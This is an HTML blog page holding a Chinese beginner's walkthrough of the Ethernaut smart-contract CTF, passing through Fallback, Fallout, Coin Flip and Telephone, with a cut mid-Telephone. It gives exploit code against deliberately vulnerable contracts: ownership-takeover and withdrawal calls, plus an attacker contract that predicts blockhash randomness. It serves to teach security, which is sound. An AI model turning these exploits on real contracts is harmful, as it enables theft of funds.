@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-flat-top.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一觉醒来大家都在和逆向切割! 那我肯定不能落后啊">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的逆向手入门Web3生活">
+<meta property="og:url" content="https://ikoct.com/2025/02/05/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%80%86%E5%90%91%E6%89%8B%E5%85%A5%E9%97%A8Web3%E7%94%9F%E6%B4%BB/">
+<meta property="og:site_name" content="Ikoct的饮冰室">
+<meta property="og:description" content="一觉醒来大家都在和逆向切割! 那我肯定不能落后啊">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F05%2F20250205-141048.png">
+<meta property="article:published_time" content="2025-02-05T08:06:09.000Z">
+<meta property="article:modified_time" content="2025-02-05T08:06:09.857Z">
+<meta property="article:author" content="1K0CT B14s">
+<meta property="article:tag" content="Solidity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F05%2F20250205-141048.png">
+
+<link rel="canonical" href="https://ikoct.com/2025/02/05/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%80%86%E5%90%91%E6%89%8B%E5%85%A5%E9%97%A8Web3%E7%94%9F%E6%B4%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>从零开始的逆向手入门Web3生活 | Ikoct的饮冰室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ikoct的饮冰室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2025/02/05/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%80%86%E5%90%91%E6%89%8B%E5%85%A5%E9%97%A8Web3%E7%94%9F%E6%B4%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/myavatar.gif">
+      <meta itemprop="name" content="1K0CT B14s">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ikoct的饮冰室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从零开始的逆向手入门Web3生活
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-05 16:06:09" itemprop="dateCreated datePublished" datetime="2025-02-05T16:06:09+08:00">2025-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web3/" itemprop="url" rel="index"><span itemprop="name">Web3</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一觉醒来大家都在和逆向切割! 那我肯定不能落后啊</p>
+<span id="more"></span>
+
+<h2 id="没有主网余额要求的sepolia水龙头"><a href="#没有主网余额要求的sepolia水龙头" class="headerlink" title="没有主网余额要求的sepolia水龙头"></a>没有主网余额要求的sepolia水龙头</h2><p><a target="_blank" rel="noopener" href="https://cloud.google.com/application/web3/faucet/ethereum/sepolia">Google Cloud Web3</a> 每天0.05eth</p>
+<p><a target="_blank" rel="noopener" href="https://console.optimism.io/faucet">Superchain Faucet</a> 每天0.1eth</p>
+<h2 id="芝士区"><a href="#芝士区" class="headerlink" title="芝士区"></a>芝士区</h2><p>基础概念上<a target="_blank" rel="noopener" href="https://solidity-by-example.org/">Solidity by Example</a>看跟着实践就行 但是感觉如果是零基础入门的话直接嗯看完再去做题大伤学习动力 最好是直接做一些智能合约漏洞的题 遇到不会的再来查 要先看的话就直接看其中感觉比较重要的几章:</p>
+<p><a target="_blank" rel="noopener" href="https://solidity-by-example.org/variables">Variables</a></p>
+<p><a target="_blank" rel="noopener" href="https://solidity-by-example.org/data-locations">Data Locations - Storage, Memory and Calldata</a></p>
+<p><a target="_blank" rel="noopener" href="https://solidity-by-example.org/view-and-pure-functions">View and Pure Functions</a></p>
+<p><a target="_blank" rel="noopener" href="https://solidity-by-example.org/function-modifier">Function Modifier</a></p>
+<p><a target="_blank" rel="noopener" href="https://solidity-by-example.org/sending-ether">Sending Ether (transfer, send, call)</a></p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="合约一些常用的常量"><a href="#合约一些常用的常量" class="headerlink" title="合约一些常用的常量"></a>合约一些常用的常量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msg.&#123;</span><br><span class="line">    sender	: 向智能合约发起交易的账号 在部署合约时 sender 指的是部署合约的外部账号,</span><br><span class="line">    value	: 向智能合约发起交易时传递的资金值,</span><br><span class="line">    data	: 储存了调用合约时交易数据的原始字节数组,</span><br><span class="line">    gas		: 当前交易可用的 gas 数量,</span><br><span class="line">    sig		: 交易调用的函数签名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ethernaut做题记录"><a href="#Ethernaut做题记录" class="headerlink" title="Ethernaut做题记录"></a>Ethernaut做题记录</h2><h3 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h3><p>这关就是让用户熟悉一下Ethernaut的一些功能的 Ethernaut提供了直接在网页的js控制台与题目进行交互的ABI 调用<code>help()</code>可以看到几个常用的宏 包括转账和金额单位转换 同时还自带js的web3库 可以调用各种API</p>
+<p>通过<code>contract.MethodName()</code>来调用合约中的函数</p>
+<p>本题的合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line">    string public password;</span><br><span class="line">    uint8 public infoNum = 42;</span><br><span class="line">    string public theMethodName = &quot;The method name is method7123949.&quot;;</span><br><span class="line">    bool private cleared = false;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _password) &#123;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;You will find what you need in info1().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info1() public pure returns (string memory) &#123;</span><br><span class="line">        return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&quot;hello&quot;))) &#123;</span><br><span class="line">            return &quot;The property infoNum holds the number of the next info method to call.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Wrong parameter.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function info42() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;theMethodName is the name of the next method.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">        return &quot;If you know the password, submit it to authenticate().&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate(string memory passkey) public &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">            cleared = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCleared() public view returns (bool) &#123;</span><br><span class="line">        return cleared;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要直接获取<code>password</code>的值然后调用<code>authenticate()</code>就能通关了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(pw)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h3><p>这关主要是让我们了解合约接收数字货币的一些特性 当一个合约接收到一定金额时 会根据以下过程判断调用哪个函数:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F02%2F05%2F20250205-141048.png" alt="image-20250205141030022"></p>
+<p>本题合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约中的<code>owner</code>被设置成了部署自己的外部账户 通关条件是将<code>owner</code>设置成<code>player</code>并调用<code>withdraw()</code>把合约里的币提走 可以看到<code>receive()</code>函数中就有修改<code>owner</code>的逻辑 根据上面判断调用哪个函数的过程 我们需要直接向合约转账 此外我们还需要先调用<code>contribute()</code>并在交易中附带一个小于0.001eth的金额来让<code>contributions[player]</code>不大于0</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.0001&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:instance, <span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.0001&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>)&#125;);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>();</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h3><p>这题目的是让我们注意审计代码</p>
+<p>题目合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>审计合约会发现注释是构造函数的其实是一个普通的函数(函数名和合约名不一致) 所以直接调用这个函数就能pwn掉这个合约了</p>
+<h3 id="Coin-flip"><a href="#Coin-flip" class="headerlink" title="Coin flip"></a>Coin flip</h3><p>这题主要是教我们自己写合约来解题</p>
+<p>题目合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过伪随机生成抛硬币的结果来让我们猜 连续猜中10次就能通关 这里为了模仿伪随机数的生成我们写一个合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_win() public view returns(uint256)&#123;</span><br><span class="line">        return consecutiveWins;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    CoinFlip target = CoinFlip(0x3A32669799018d0dc834401e6B6a31f4499819cB);</span><br><span class="line">    // CoinFlip target = CoinFlip(0x93f8dddd876c7dBE3323723500e83E202A7C96CC);</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() payable public returns(bool)&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        bool guess = uint256(blockValue / FACTOR) == 1 ? true : false;</span><br><span class="line">        return target.flip(guess);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是题目合约中对每次发起交易时所在的区块有要求 我们至少要调用<code>contract.flip()</code>10次 而每次发起交易不能让交易在之前完成过交易的区块上完成 所以不能直接循环10次调用目标函数 反正我是自己点了10次<code>attack()</code>的(</p>
+<h3 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h3><p>这题主要是让我们区分<code>msg.sender</code>和<code>tx.origin</code>  后者记录的是调用链的源头 而前者记录的是直接发起交易的对象</p>
+<p>例如外部账户A通过调用已部署的合约B调用了另一个合约C 那么这笔交易的<code>tx.origin</code>是address(A) 而<code>msg.sender</code>是address(B)</p>
+<p>题目合约:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要我们通过合约来调用目标合约就能达成<code>tx.origin != msg.sender</code>了:</p>
